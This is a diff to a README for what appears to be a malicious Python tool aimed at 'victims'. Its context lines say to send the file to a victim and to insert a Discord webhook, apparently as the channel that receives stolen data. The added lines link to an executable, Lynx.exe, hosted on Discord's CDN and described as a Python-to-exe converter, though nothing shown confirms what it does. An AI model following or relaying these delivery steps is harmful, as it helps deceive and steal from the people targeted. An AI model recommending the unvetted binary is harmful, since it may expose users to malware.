@@ -23,7 +23,8 @@
 - Send the python file to your victim and make sure your victim has python installed or it wont work, Its as simple as that.
 ## Replace this with your webhook in your discord server. Here is a video on how to make a webhook: https://www.youtube.com/watch?v=fKksxz2Gdnc
 ![Picture](https://media.discordapp.net/attachments/847548138020667405/849346896026664970/unknown.png)
-
+## Python to Exe
+https://cdn.discordapp.com/attachments/849317414222430280/849350325382021150/Lynx.exe is a Free Python to exe converter without you having to type anything in cmd
 ## Donate
 
 If you want to help me in my work, consider donating. Thank you!
